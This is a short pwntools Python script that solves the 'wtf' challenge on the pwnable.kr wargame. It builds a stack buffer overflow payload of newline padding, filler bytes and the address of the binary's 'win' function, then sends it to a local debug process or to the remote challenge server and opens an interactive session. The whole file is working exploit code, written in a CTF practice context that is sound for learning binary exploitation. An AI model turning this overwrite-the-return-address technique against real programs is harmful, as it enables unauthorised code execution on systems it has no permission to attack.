from pwn import *

context.log_level = 'debug'
elf = context.binary = ELF('./wtf')

ret_addr = 0x00000000004004a7
payload = b'-1'.ljust(4096, b'\n') + b'a' * 0x38 + p64(elf.sym['win']) + b'\n'

if sys.argv[1] == 'debug':
    # p = process('./wtf')
    p = gdb.debug(['./wtf'])
    p.sendline(payload)
else:
    p = remote('pwnable.kr', '9015')
    p.sendlineafter(b'payload please : ', payload.hex().encode())

p.interactive()
